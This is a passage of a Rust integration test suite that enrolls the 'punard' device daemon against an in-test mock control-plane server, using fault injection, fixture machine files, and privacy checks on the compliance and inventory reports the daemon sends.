//! M5 enrollment integration tests: a real `punard` daemon on a tempdir
//! socket, enrolled against a live control-plane counterparty speaking the
//! `punar-mock-smplify` wire protocol (milestone-5.md section 4.3 —
//! NDJSON `{v,id,method,params}` over a UDS; `org.discover`,
//! `enroll.register`, `policy.fetch`, `compliance.report`,
//! `inventory.report`) and serving the Acme fixtures verbatim, with the
//! one documented composition (envelope + embedded desired-state as
//! `policy`).
//!
//! The counterparty here is an in-test server implementing that documented
//! protocol so the suite can stop, restart, and corrupt it deterministically
//! (offline phases, all-or-nothing aborts); the in-VM `m5-check` exercises
//! the real `punar-mock-smplify` binary end-to-end against the same
//! contract.

use std::collections::HashMap;
use std::fs;
use std::io::{BufRead, BufReader, Write};
use std::os::unix::fs::PermissionsExt;
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use ed25519_dalek::{Signer, SigningKey};
use punar_common::storage::StorageSources;
use punar_common::update::{Architecture, BootPlatform};
use punard::agent_units::{AGENT_EXECUTABLE, AgentIntegrity};
use punard::authz::{Peer, PeerSource};
use punard::capability::Registry;
use punard::capability::mock::MockCapability;
use punard::device::DeviceSources;
use punard::inventory::CollectorSources;
use punard::server::{Daemon, DaemonConfig, DaemonHandle};
use punard::update_check::UpdateCheckSources;
use punard::update_status::UpdateStatusSources;
use serde_json::{Value, json};

const ACME_ORG: &str = include_str!("../../../fixtures/organizations/acme/org.json");
const ACME_ENVELOPE: &str =
    include_str!("../../../fixtures/organizations/acme/policy-source-eng-baseline-v12.json");
const ACME_DESIRED: &str =
    include_str!("../../../fixtures/organizations/acme/desired-state-eng-baseline-v12.json");

static TEST_SEQ: AtomicU32 = AtomicU32::new(0);

fn test_dir(tag: &str) -> PathBuf {
    let seq = TEST_SEQ.fetch_add(1, Ordering::SeqCst);
    let dir = std::env::temp_dir().join(format!("punard-m5-{tag}-{}-{seq}", std::process::id()));
    fs::create_dir_all(&dir).unwrap();
    dir
}

// ---------------------------------------------------------------------------
// In-test control plane (the milestone-5.md section 4.3 protocol)
// ---------------------------------------------------------------------------

#[derive(Default)]
struct ControlPlaneState {
    /// token → device_id (the mock's `devices.json` in miniature).
    devices: Mutex<HashMap<String, String>>,
    /// Received compliance lines (`received-compliance.jsonl`).
    compliance: Mutex<Vec<Value>>,
    /// Received inventory lines (`received-inventory.jsonl`).
    inventory: Mutex<Vec<Value>>,
    /// The `code` each `enroll.register` carried (`None` when absent): the
    /// enrollment code must reach the control plane and nothing else.
    codes: Mutex<Vec<Option<String>>>,
    /// Fault injection: serve a corrupt policy envelope (contradicted
    /// fixed rank) so the all-or-nothing abort path can be exercised.
    serve_bad_policy: AtomicBool,
    /// Serve no policy at all — a fresh Smplify tenant that has not assigned
    /// anything to this device yet (`policy.fetch` answers `{policies: []}`
    /// with `assignment: "none"`).
    serve_no_policy: AtomicBool,
    /// Serve this as the baseline's `spec.security.firewall.enabled`; the
    /// fixture's own value when `None`.
    firewall_enabled: Mutex<Option<bool>>,
    /// Serve these envelopes after the baseline.
    extra_envelopes: Mutex<Vec<Value>>,
    /// Serve this `assignment` marker instead of the one the answer implies
    /// (`policies`, or `none` for an empty list).
    assignment: Mutex<Option<&'static str>>,
    /// Serve no `assignment` marker at all: a control plane that predates it.
    omit_assignment: AtomicBool,
    /// Serve the baseline twice.
    serve_duplicate_ids: AtomicBool,
    /// Refuse `policy.fetch` with this error code.
    refuse_policy_fetch: Mutex<Option<&'static str>>,
    /// Pad the `policy.fetch` answer with this many bytes of text: an answer
    /// longer than punard reads.
    pad_policy_answer: AtomicUsize,
    /// Refuse `org.discover` of an unknown domain with this message: words
    /// the control plane chose.
    not_found_message: Mutex<Option<String>>,
    /// Take every request that needs the organization's server and answer
    /// none: a link that drops everything past the connection. The calls
    /// the agent answers from the device alone still work.
    black_hole: AtomicBool,
    /// Take every request and answer none, those included: a frozen agent.
    frozen: AtomicBool,
    /// Answer every call that needs the organization's server as the
    /// built-in agent does while the device is offline: with its own
    /// `internal` error, promptly. The calls it answers from the device alone
    /// still work.
    offline: AtomicBool,
    /// Read each request and close the connection without answering: an
    /// agent killed mid-call.
    hang_up: AtomicBool,
    /// Close each connection at once, before reading anything: the reset a
    /// caller sees from an agent that dies as it accepts.
    reset: AtomicBool,
    /// Answer `identity.status` as an agent whose identity was deleted.
    forget_identity: AtomicBool,
    /// Answer `identity.status` as an agent holding another device's
    /// identity.
    other_identity: AtomicBool,
    /// Refuse `enroll.unregister`: an agent that cannot wipe.
    refuse_unregister: AtomicBool,
    /// Every `enroll.unregister`'s params, as they arrived.
    unregisters: Mutex<Vec<Value>>,
    /// Whether punard's release record was on disk when `enroll.register`
    /// arrived, for the `release_record` path set here.
    release_record: Mutex<Option<PathBuf>>,
    record_before_register: Mutex<Vec<bool>>,
    /// Serve a desired state that turns local policy editing off
    /// (spec section 44.5; docs/api/ipc.md section 5.7 `local_admin`).
    deny_local_admin: AtomicBool,
    token_seq: AtomicUsize,
    /// Every method punard called, in order: proves whether anything left
    /// the device on behalf of a caller.
    methods: Mutex<Vec<String>>,
    /// Every connection accepted, whether or not a call followed: with the
    /// agent's socket owned by systemd, a bare connect is enough to start
    /// the agent (`Accept=no` triggers on the connection), so a device that
    /// must never run it must never connect.
    connections: AtomicUsize,
    /// Answer `identity.status` with this line verbatim instead: something
    /// that is not the agent answering on its socket.
    raw_identity_status: Mutex<Option<String>>,
    /// Every request line exactly as it arrived, to prove what never did.
    lines: Mutex<Vec<String>>,
    /// Serve this as the organization document's `enrollment.removable`
    /// (docs/development/smplify-enrollment.md section 3.1); absent when
    /// `None`, as in the Acme fixture.
    org_removable: Mutex<Option<Value>>,
    /// Serve this as the organization document's `enrollment.ownership`
    /// (docs/development/smplify-enrollment.md section 3.2); absent when
    /// `None`, as in the Acme fixture.
    org_ownership: Mutex<Option<Value>>,
    /// Serve these as the organization document's `enrollment.display_name`,
    /// `name` and `discovery.domain`: strings the organization chooses.
    org_display_name: Mutex<Option<Value>>,
    org_name: Mutex<Option<Value>>,
    org_shown_domain: Mutex<Option<Value>>,
    /// Answer `inventory.report` as `punar-smplifyd` does: put the inventory
    /// through the agent's own translation and answer `{sent}` with the
    /// result. Off, it answers as the development mock does.
    translate_like_smplifyd: AtomicBool,
    /// Every body that translation produced: what Smplify itself received.
    status_bodies: Mutex<Vec<Value>>,
    /// Answer these methods only after the given delay: a control plane
    /// that is slow to reach the organization's server.
    answer_late: Mutex<HashMap<&'static str, Duration>>,
    /// Refuse every `inventory.report`: an inventory that cannot get
    /// through.
    refuse_inventory: AtomicBool,
    /// Hold the next report of this method, once its token is resolved,
    /// until `release_held`: a sync pass caught with its report in flight.
    hold_next: Mutex<Option<&'static str>>,
    held: AtomicBool,
    release_held: AtomicBool,
}

impl ControlPlaneState {
    fn handle(&self, method: &str, params: &Value) -> Result<Value, (&'static str, String)> {
        let late = self.answer_late.lock().unwrap().get(method).copied();
        if let Some(delay) = late {
            std::thread::sleep(delay);
        }
        if self.offline.load(Ordering::SeqCst)
            && !matches!(method, "identity.status" | "enroll.unregister")
        {
            return Err(("internal", "transport failed (connecting timed out)".into()));
        }
        match method {
            "org.discover" => {
                let domain = params["domain"].as_str().unwrap_or_default();
                let mut org: Value = serde_json::from_str(ACME_ORG).unwrap();
                if let Some(removable) = self.org_removable.lock().unwrap().clone() {
                    org["enrollment"]["removable"] = removable;
                }
                if let Some(ownership) = self.org_ownership.lock().unwrap().clone() {
                    org["enrollment"]["ownership"] = ownership;
                }
                if domain != org["discovery"]["domain"].as_str().unwrap() {
                    let message = self.not_found_message.lock().unwrap().clone();
                    return Err((
                        "not_found",
                        message.unwrap_or_else(|| format!("no organization at {domain:?}")),
                    ));
                }
                if let Some(name) = self.org_display_name.lock().unwrap().clone() {
                    org["enrollment"]["display_name"] = name;
                }
                if let Some(name) = self.org_name.lock().unwrap().clone() {
                    org["name"] = name;
                }
                if let Some(shown) = self.org_shown_domain.lock().unwrap().clone() {
                    org["discovery"]["domain"] = shown;
                }
                Ok(json!({ "organization": org }))
            }
            "enroll.register" => {
                if let Some(record) = self.release_record.lock().unwrap().as_ref() {
                    self.record_before_register
                        .lock()
                        .unwrap()
                        .push(record.exists());
                }
                let device_id = params["device_id"].as_str().unwrap_or_default();
                let bootstrap = params["bootstrap"].as_str().unwrap_or_default();
                // The mock's admission rule: ≥ 32 hex chars.
                if bootstrap.len() < 32 || !bootstrap.chars().all(|c| c.is_ascii_hexdigit()) {
                    return Err(("invalid_params", "bootstrap must be ≥32 hex chars".into()));
                }
                self.codes
                    .lock()
                    .unwrap()
                    .push(params["code"].as_str().map(str::to_string));
                let seq = self.token_seq.fetch_add(1, Ordering::SeqCst);
                let token = format!("tok_{seq:08x}{}", "e5d1c0de".repeat(6));
                self.devices
                    .lock()
                    .unwrap()
                    .insert(token.clone(), device_id.to_string());
                Ok(json!({
                    "device_token": token,
                    "attestation": "simulated",
                    "organization": serde_json::from_str::<Value>(ACME_ORG).unwrap(),
                }))
            }
            "policy.fetch" => {
                self.device_for(params)?;
                if let Some(code) = *self.refuse_policy_fetch.lock().unwrap() {
                    return Err((code, "the organization's server refused".into()));
                }
                let mut policies = Vec::new();
                if !self.serve_no_policy.load(Ordering::SeqCst) {
                    let mut envelope: Value = serde_json::from_str(ACME_ENVELOPE).unwrap();
                    if self.serve_bad_policy.load(Ordering::SeqCst) {
                        envelope["precedence_rank"] = json!(5); // fixed rank is 2
                    }
                    let mut desired = serde_json::from_str::<Value>(ACME_DESIRED).unwrap();
                    if self.deny_local_admin.load(Ordering::SeqCst) {
                        desired["spec"]["security"]["localAdmin"] =
                            json!({ "policyEditing": "denied" });
                    }
                    if let Some(enabled) = *self.firewall_enabled.lock().unwrap() {
                        desired["spec"]["security"]["firewall"]["enabled"] = json!(enabled);
                    }
                    envelope
                        .as_object_mut()
                        .unwrap()
                        .insert("policy".to_string(), desired);
                    if self.serve_duplicate_ids.load(Ordering::SeqCst) {
                        policies.push(envelope.clone());
                    }
                    policies.push(envelope);
                    policies.extend(self.extra_envelopes.lock().unwrap().iter().cloned());
                }
                let mut result = json!({ "policies": policies });
                let pad = self.pad_policy_answer.load(Ordering::SeqCst);
                if pad > 0 {
                    result["padding"] = json!("x".repeat(pad));
                }
                if !self.omit_assignment.load(Ordering::SeqCst) {
                    let implied = if policies.is_empty() {
                        "none"
                    } else {
                        "policies"
                    };
                    let marker = self.assignment.lock().unwrap().unwrap_or(implied);
                    result["assignment"] = json!(marker);
                }
                Ok(result)
            }
            "compliance.report" => {
                let device_id = self.device_for(params)?;
                self.hold_if_next(method);
                self.compliance.lock().unwrap().push(json!({
                    "device_id": device_id,
                    "received_at": "now",
                    "report": params["report"],
                }));
                Ok(json!({ "accepted": true }))
            }
            "inventory.report" => {
                let device_id = self.device_for(params)?;
                self.hold_if_next(method);
                if self.refuse_inventory.load(Ordering::SeqCst) {
                    return Err(("internal", "the upload did not finish in time".into()));
                }
                self.inventory.lock().unwrap().push(json!({
                    "device_id": device_id,
                    "received_at": "now",
                    "inventory": params["inventory"],
                }));
                if self.translate_like_smplifyd.load(Ordering::SeqCst) {
                    let body = punar_smplifyd::status::inventory_status_body(
                        &device_id,
                        &params["inventory"],
                    );
                    self.status_bodies.lock().unwrap().push(body.clone());
                    return Ok(json!({ "sent": body }));
                }
                Ok(json!({ "accepted": true }))
            }
            // admin.* stays reserved for M10 — like every unknown name.
            "enroll.unregister" => {
                if self.refuse_unregister.load(Ordering::SeqCst) {
                    return Err(("internal", "identity storage failed (StorageFull)".into()));
                }
                self.unregisters.lock().unwrap().push(params.clone());
                // The agent holds one identity at most: `any_identity`
                // wipes it, whatever token (or none) comes along.
                if params["any_identity"] == json!(true) {
                    self.devices.lock().unwrap().clear();
                } else {
                    let token = params["device_token"].as_str().unwrap_or_default();
                    self.devices.lock().unwrap().remove(token);
                }
                Ok(json!({"wiped": true}))
            }
            // The agent's liveness call: its identity, and whether this
            // device's token is the one it holds.
            "identity.status" => {
                let token = params["device_token"].as_str().unwrap_or_default();
                let known = self.devices.lock().unwrap().contains_key(token);
                if self.forget_identity.load(Ordering::SeqCst) || !known {
                    return Ok(json!({"enrolled": false}));
                }
                Ok(json!({
                    "enrolled": true,
                    "token_matches": !self.other_identity.load(Ordering::SeqCst),
                }))
            }
            other => Err(("unknown_method", format!("no method {other:?}"))),
        }
    }

    /// Hold this report until `release_held` if it is the one `hold_next`
    /// names.
    fn hold_if_next(&self, method: &str) {
        {
            let mut next = self.hold_next.lock().unwrap();
            if *next != Some(method) {
                return;
            }
            *next = None;
        }
        self.held.store(true, Ordering::SeqCst);
        while !self.release_held.load(Ordering::SeqCst) {
            std::thread::sleep(Duration::from_millis(5));
        }
    }

    fn device_for(&self, params: &Value) -> Result<String, (&'static str, String)> {
        let token = params["device_token"].as_str().unwrap_or_default();
        self.devices
            .lock()
            .unwrap()
            .get(token)
            .cloned()
            .ok_or(("unauthorized", "unknown device token".into()))
    }
}

struct ControlPlane {
    socket: PathBuf,
    state: Arc<ControlPlaneState>,
    stop: Arc<AtomicBool>,
    thread: Option<JoinHandle<()>>,
}

impl ControlPlane {
    fn start(dir: &Path) -> ControlPlane {
        Self::start_with(dir, Arc::new(ControlPlaneState::default()))
    }

    /// (Re)start on the same socket path with existing state — the mock's
    /// state deliberately persists across restarts (milestone-5.md § 4.5).
    fn start_with(dir: &Path, state: Arc<ControlPlaneState>) -> ControlPlane {
        let socket = dir.join("control-plane.sock");
        let _ = fs::remove_file(&socket);
        let listener = UnixListener::bind(&socket).unwrap();
        let stop = Arc::new(AtomicBool::new(false));
        let accept_state = Arc::clone(&state);
        let accept_stop = Arc::clone(&stop);
        let thread = std::thread::spawn(move || {
            for stream in listener.incoming() {
                if accept_stop.load(Ordering::SeqCst) {
                    break;
                }
                let Ok(stream) = stream else { break };
                accept_state.connections.fetch_add(1, Ordering::SeqCst);
                let state = Arc::clone(&accept_state);
                std::thread::spawn(move || serve_connection(stream, &state));
            }
        });
        ControlPlane {
            socket,
            state,
            stop,
            thread: Some(thread),
        }
    }

    /// Stop the server and remove the socket — the "control plane died"
    /// phase. State survives for a later [`ControlPlane::start_with`].
    fn stop(mut self) -> Arc<ControlPlaneState> {
        self.stop.store(true, Ordering::SeqCst);
        let _ = UnixStream::connect(&self.socket);
        if let Some(thread) = self.thread.take() {
            let _ = thread.join();
        }
        let _ = fs::remove_file(&self.socket);
        Arc::clone(&self.state)
    }
}

impl Drop for ControlPlane {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::SeqCst);
        let _ = UnixStream::connect(&self.socket);
        if let Some(thread) = self.thread.take() {
            let _ = thread.join();
        }
    }
}

fn serve_connection(stream: UnixStream, state: &ControlPlaneState) {
    if state.reset.load(Ordering::SeqCst) {
        drop(stream);
        return;
    }
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut writer = stream;
    let mut line = String::new();
    while let Ok(read) = reader.read_line(&mut line) {
        if read == 0 {
            break;
        }
        let request: Value = match serde_json::from_str(line.trim_end()) {
            Ok(value) => value,
            Err(_) => break,
        };
        assert_eq!(request["v"], json!(1), "punard must send v:1");
        let id = request["id"].clone();
        let method = request["method"].as_str().unwrap_or_default();
        let params = request.get("params").cloned().unwrap_or(json!({}));
        state.methods.lock().unwrap().push(method.to_string());
        state.lines.lock().unwrap().push(line.clone());
        let local = matches!(method, "identity.status" | "enroll.unregister");
        if state.frozen.load(Ordering::SeqCst)
            || (state.black_hole.load(Ordering::SeqCst) && !local)
        {
            // Held until punard stops waiting and hangs up.
            line.clear();
            let _ = reader.read_line(&mut line);
            break;
        }
        if state.hang_up.load(Ordering::SeqCst) {
            break;
        }
        if method == "identity.status" {
            if let Some(raw) = state.raw_identity_status.lock().unwrap().clone() {
                let _ = writeln!(writer, "{raw}");
                break;
            }
        }
        let response = match state.handle(method, &params) {
            Ok(result) => json!({"v": 1, "id": id, "result": result}),
            Err((code, message)) => {
                json!({"v": 1, "id": id, "error": {"code": code, "message": message}})
            }
        };
        if writeln!(writer, "{response}").is_err() {
            break;
        }
        line.clear();
    }
}

// ---------------------------------------------------------------------------
// Daemon harness (mirrors tests/daemon.rs, plus the M5 config seams)
// ---------------------------------------------------------------------------

struct TestDaemon {
    dir: PathBuf,
    handle: Option<DaemonHandle>,
    #[allow(dead_code)]
    mock: MockCapability,
}

fn write_nss_files(dir: &Path) -> (PathBuf, PathBuf) {
    let group_file = dir.join("group");
    fs::write(&group_file, "root:x:0:\npunar:x:970:\n").unwrap();
    let passwd_file = dir.join("passwd");
    fs::write(
        &passwd_file,
        "root:x:0:0::/root:/bin/bash\npunar:x:1000:1000::/home/punar:/bin/nologin\n",
    )
    .unwrap();
    (group_file, passwd_file)
}

fn write_inventory_sources(dir: &Path) -> (PathBuf, PathBuf) {
    let os_release = dir.join("os-release");
    fs::write(
        &os_release,
        "ID=punar\nVERSION_ID=\"0.5\"\nPRETTY_NAME=\"Punar OS 0.5 (M5)\"\n",
    )
    .unwrap();
    let kernel = dir.join("osrelease");
    fs::write(&kernel, "6.12.0-punar\n").unwrap();
    (os_release, kernel)
}

/// The serial number the fixture firmware reports. It must never reach a
/// personal enrollment's inventory.
const FIXTURE_SERIAL: &str = "PNR-FIXTURE-SERIAL-0042";

fn write_file(path: &Path, contents: impl AsRef<[u8]>) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, contents).unwrap();
}

/// A fixture machine for the managed inventory's collectors — a QEMU x86_64
/// guest with SMBIOS, UEFI (Secure Boot off), a TPM 2.0, LUKS2 under /var and
/// /home (hidden from punard's own namespace, as ProtectHome=yes hides it),
/// a system Flatpak installation and Punar's desktop entries — so nothing the
/// daemon reports depends on the host running the test.
fn write_collector_sources(dir: &Path) -> (CollectorSources, UpdateStatusSources, PathBuf) {
    let root = dir.join("machine");
    let at = |relative: &str| root.join(relative);
    write_file(&at("proc/meminfo"), "MemTotal:        8192000 kB\n");
    write_file(&at("sys/devices/system/cpu/online"), "0-3\n");
    for cpu in 0..4 {
        write_file(
            &at(&format!(
                "sys/devices/system/cpu/cpu{cpu}/topology/core_cpus_list"
            )),
            format!("{cpu}\n"),
        );
    }
    write_file(
        &at("proc/cpuinfo"),
        "processor\t: 0\nvendor_id\t: AuthenticAMD\nmodel name\t: QEMU Virtual CPU\n\
         flags\t\t: fpu hypervisor\n",
    );
    write_file(&at("sys/class/dmi/id/sys_vendor"), "QEMU\n");
    write_file(
        &at("sys/class/dmi/id/product_name"),
        "Standard PC (Q35 + ICH9, 2009)\n",
    );
    write_file(&at("sys/class/dmi/id/bios_version"), "1.16.3\n");
    write_file(
        &at("sys/class/dmi/id/product_serial"),
        format!("{FIXTURE_SERIAL}\n"),
    );
    write_file(
        &at("sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c"),
        [6u8, 0, 0, 0, 0],
    );
    write_file(&at("sys/class/tpm/tpm0/tpm_version_major"), "2\n");
    write_file(&at("sys/class/power_supply/AC/type"), "Mains\n");
    // /var and /home are subvolumes of one btrfs on the LUKS2 mapping
    // punar-data. The system's mount table says so; punard's own ends with
    // the empty tmpfs ProtectHome=yes stacks on /home, as in production.
    fs::create_dir_all(at("var")).unwrap();
    fs::create_dir_all(at("home")).unwrap();
    let system_mounts = format!(
        "22 1 253:1 / / ro,relatime - erofs /dev/mapper/usr ro\n\
         40 22 0:44 /@var {} rw - btrfs /dev/mapper/punar-data rw,subvol=/@var\n\
         41 22 0:44 /@home {} rw - btrfs /dev/mapper/punar-data rw,subvol=/@home\n",
        at("var").display(),
        at("home").display()
    );
    write_file(&at("proc/1/mountinfo"), &system_mounts);
    write_file(
        &at("proc/self/mountinfo"),
        format!(
            "{system_mounts}90 41 0:25 /systemd/inaccessible/dir {} ro - tmpfs tmpfs rw\n",
            at("home").display()
        ),
    );
    write_file(&at("sys/class/block/dm-0/dm/name"), "punar-data\n");
    write_file(&at("sys/class/block/dm-0/dev"), "253:0\n");
    write_file(
        &at("sys/class/block/dm-0/dm/uuid"),
        "CRYPT-LUKS2-0123456789abcdef-punar-data\n",
    );
    fs::create_dir_all(at("sys/fs/btrfs/9f1c/devices/dm-0")).unwrap();
    write_file(
        &at("usr/local/share/applications/org.punar.Mail.desktop"),
        "[Desktop Entry]\nType=Application\nName=Mail\nX-Punar-FirstParty=true\n",
    );
    write_file(
        &at("usr/share/applications/thunar.desktop"),
        "[Desktop Entry]\nType=Application\nName=Thunar File Manager\n",
    );
    // A system installation exists, so only the tier stops it being listed.
    write_file(&at("var/lib/flatpak/.changed"), "");
    let flatpak = at("bin/flatpak");
    write_file(
        &flatpak,
        format!(
            "#!/bin/sh\nprintf '%s\\n' \"$*\" >> '{}'\n\
             printf 'org.mozilla.firefox\\tFirefox\\t131.0\\t0123456789ab\\n'\n",
            at("flatpak-argv").display()
        ),
    );
    fs::set_permissions(&flatpak, fs::Permissions::from_mode(0o755)).unwrap();
    write_file(
        &at("var/lib/dpkg/status"),
        "Package: chromium\nStatus: install ok installed\nVersion: 151.0.7922.173-1\n\n",
    );
    write_file(&at("proc/cmdline"), "quiet rw\n");

    let collector = CollectorSources {
        device: DeviceSources {
            meminfo: at("proc/meminfo"),
            cpu_online: at("sys/devices/system/cpu/online"),
            power_supply_dir: at("sys/class/power_supply"),
            drm_dir: at("sys/class/drm"),
        },
        cpuinfo: at("proc/cpuinfo"),
        cpu_dir: at("sys/devices/system/cpu"),
        dmi_dir: at("sys/class/dmi/id"),
        device_tree_dir: at("proc/device-tree"),
        efi_dir: at("sys/firmware/efi"),
        tpm_dir: at("sys/class/tpm"),
        storage: StorageSources {
            sys_dev_block: at("sys/dev/block"),
            sys_class_block: at("sys/class/block"),
            sys_fs_btrfs: at("sys/fs/btrfs"),
            mountinfo: at("proc/self/mountinfo"),
        },
        system_mountinfo: at("proc/1/mountinfo"),
        encrypted_paths: vec![at("var"), at("home")],
        capacity_path: root.clone(),
        desktop_entry_dirs: vec![
            at("usr/local/share/applications"),
            at("usr/share/applications"),
        ],
        flatpak_installation: at("var/lib/flatpak"),
        detect_virt_bin: at("bin/systemd-detect-virt"),
    };
    let update_status = UpdateStatusSources {
        os_release: dir.join("os-release"),
        cmdline: at("proc/cmdline"),
        pi_boot_partition: at("proc/device-tree/chosen/bootloader/partition"),
        pi_tryboot: at("proc/device-tree/chosen/bootloader/tryboot"),
        health_report: at("run/punar/update-health.json"),
        pending_pi: at("var/lib/punar/update/pending-pi.json"),
        pending_uefi: at("var/lib/punar/update/pending-uefi.json"),
        channel_preference: at("var/lib/punar/update/channel"),
        dpkg_status: at("var/lib/dpkg/status"),
        pacman_local: at("var/lib/pacman/local"),
    };
    (collector, update_status, flatpak)
}

impl TestDaemon {
    /// Start a daemon whose control-plane endpoint is `control_plane` and
    /// whose registry holds one `security.firewall` mock (the capability
    /// the Acme baseline pins).
    fn start(dir: &Path, peer: Peer, control_plane: &Path, firewall_state: &str) -> TestDaemon {
        Self::start_with(dir, peer, control_plane, firewall_state, Vec::new(), |_| {})
    }

    /// [`TestDaemon::start`], with more mock capabilities registered after
    /// the firewall and a last word on the configuration.
    fn start_with(
        dir: &Path,
        peer: Peer,
        control_plane: &Path,
        firewall_state: &str,
        more: Vec<MockCapability>,
        configure: impl FnOnce(&mut DaemonConfig),
    ) -> TestDaemon {
        let (group_file, passwd_file) = write_nss_files(dir);
        let (os_release_path, kernel_release_path) = write_inventory_sources(dir);
        let (inventory_sources, update_status_sources, flatpak_bin) = write_collector_sources(dir);
        let state_dir = dir.join("state");
        fs::create_dir_all(&state_dir).unwrap();
        let mock = MockCapability::new("security.firewall", json!(firewall_state));
        let mut capabilities: Vec<Box<dyn punard::capability::Capability>> =
            vec![Box::new(mock.clone())];
        capabilities.extend(
            more.into_iter()
                .map(|cap| Box::new(cap) as Box<dyn punard::capability::Capability>),
        );
        let registry = Registry::new(capabilities);
        let seq = TEST_SEQ.fetch_add(1, Ordering::SeqCst);
        let mut cfg = DaemonConfig {
            group_file,
            passwd_file,
            peer_source: PeerSource::Fixed(peer),
            io_timeout: Duration::from_secs(10),
            control_plane_socket: control_plane.to_path_buf(),
            os_release_path,
            kernel_release_path,
            inventory_sources,
            update_status_sources,
            flatpak_bin,
            reauth_ticket_dir: dir.join("tickets"),
            proc_root: dir.join("proc"),
            ..DaemonConfig::new(
                dir.join(format!("punard-{seq}.sock")),
                state_dir,
                dir.join("audit.jsonl"),
            )
        };
        configure(&mut cfg);
        let daemon = Daemon::new(cfg, registry).unwrap();
        daemon.boot_reconcile();
        let handle = daemon.spawn().unwrap();
        TestDaemon {
            dir: dir.to_path_buf(),
            handle: Some(handle),
            mock,
        }
    }

    fn stop(mut self) {
        if let Some(handle) = self.handle.take() {
            handle.stop();
        }
    }

    fn call(&self, method: &str, params: Option<Value>) -> Value {
        let mut request = json!({ "v": 1, "id": "m5-t", "method": method });
        if let Some(params) = params {
            request["params"] = params;
        }
        let mut stream = UnixStream::connect(self.handle.as_ref().unwrap().socket_path()).unwrap();
        stream
            .set_read_timeout(Some(Duration::from_secs(30)))
            .unwrap();
        stream.write_all(request.to_string().as_bytes()).unwrap();
        stream.write_all(b"\n").unwrap();
        let mut reader = BufReader::new(stream);
        let mut response = String::new();
        reader.read_line(&mut response).unwrap();
        serde_json::from_str(&response).unwrap()
    }

    fn result(&self, method: &str, params: Option<Value>) -> Value {
        let response = self.call(method, params);
        assert!(
            response.get("error").is_none(),
            "{method} failed: {response}"
        );
        response["result"].clone()
    }

    fn error(&self, method: &str, params: Option<Value>) -> Value {
        let response = self.call(method, params);
        assert!(
            response.get("result").is_none(),
            "{method} unexpectedly succeeded: {response}"
        );
        response["error"].clone()
    }

    fn state_path(&self, name: &str) -> PathBuf {
        self.dir.join("state").join(name)
    }

    fn audit_text(&self) -> String {
        fs::read_to_string(self.dir.join("audit.jsonl")).unwrap_or_default()
    }

    fn audit_events(&self) -> Vec<Value> {
        self.audit_text()
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }

    fn status_summary(&self) -> Value {
        serde_json::from_str(&fs::read_to_string(self.state_path("status.json")).unwrap()).unwrap()
    }
}

impl Drop for TestDaemon {
    fn drop(&mut self) {
        if let Some(handle) = self.handle.take() {
            handle.stop();
        }
    }
}

fn mode_of(path: &Path) -> u32 {
    fs::metadata(path).unwrap().permissions().mode() & 0o777
}

/// The `enroll.agent` audit events, as (result, resource) in order.
fn agent_events(daemon: &TestDaemon) -> Vec<(String, String)> {
    daemon
        .audit_events()
        .iter()
        .filter(|e| e["action"] == "enroll.agent")
        .map(|e| {
            (
                e["result"].as_str().unwrap().to_string(),
                e["resource"].as_str().unwrap().to_string(),
            )
        })
        .collect()
}

/// How many times punard asked for its policy.
fn fetch_count(state: &ControlPlaneState) -> usize {
    state
        .methods
        .lock()
        .unwrap()
        .iter()
        .filter(|method| *method == "policy.fetch")
        .count()
}

/// Every file in policy.d, with its contents (as text, so a failing
/// comparison reads).
fn policy_d_bytes(daemon: &TestDaemon) -> std::collections::BTreeMap<String, String> {
    match fs::read_dir(daemon.state_path("policy.d")) {
        Ok(entries) => entries
            .map(|e| {
                let e = e.unwrap();
                let bytes = fs::read(e.path()).unwrap_or_default();
                (
                    e.file_name().to_string_lossy().into_owned(),
                    String::from_utf8_lossy(&bytes).into_owned(),
                )
            })
            .collect(),
        Err(_) => Default::default(),
    }
}

/// The `enroll.policy` audit events, in order.
fn policy_events(daemon: &TestDaemon) -> Vec<Value> {
    daemon
        .audit_events()
        .into_iter()
        .filter(|e| e["action"] == "enroll.policy")
        .collect()
}

/// A second organization envelope: a rank-3 role policy with a payload of
/// its own.
fn role_envelope(id: &str) -> Value {
    json!({
        "policy_id": id,
        "source_kind": "organization_role_policy",
        "precedence_rank": 3,
        "source_name": "Acme SRE role",
        "policy": {
            "apiVersion": "smplify.io/v1alpha1",
            "kind": "DeviceDesiredState",
            "metadata": {"organization": "acme"},
            "spec": {"update": {"channel": "stable"}}
        }
    })
}

fn policy_d_files(daemon: &TestDaemon) -> Vec<String> {
    match fs::read_dir(daemon.state_path("policy.d")) {
        Ok(entries) => entries
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// Assert the SPEC 24/54 privacy shape of one received compliance line:
/// exact key sets, category states only — never values or activity.
fn assert_compliance_shape(line: &Value, device_id: &str) {
    assert_eq!(line["device_id"], device_id);
    let report = line["report"].as_object().unwrap();
    let mut keys: Vec<&str> = report.keys().map(String::as_str).collect();
    keys.sort_unstable();
    assert_eq!(keys, ["categories", "overall"], "category states ONLY");
    for entry in report["categories"].as_array().unwrap() {
        let mut keys: Vec<&str> = entry
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        keys.sort_unstable();
        assert_eq!(keys, ["category", "state"]);
    }
}

fn sorted_keys(value: &Value) -> Vec<&str> {
    let mut keys: Vec<&str> = value
        .as_object()
        .unwrap()
        .keys()
        .map(String::as_str)
        .collect();
    keys.sort_unstable();
    keys
}

/// The received inventory of a personal (not organization-owned) enrollment,
/// as exact key sets: device facts and posture states, the image's own
/// applications, no identifiers — checked where it arrives, not where it was
/// built.
fn assert_personal_inventory(body: &Value) {
    assert_eq!(
        sorted_keys(body),
        [
            "applications",
            "capabilities",
            "hardware",
            "kernel",
            "os",
            "posture"
        ],
        "no identifiers on a personal enrollment, and never the hostname"
    );
    assert_eq!(
        sorted_keys(&body["os"]),
        [
            "architecture",
            "id",
            "image_id",
            "image_version",
            "pretty_name",
            "version_id"
        ]
    );
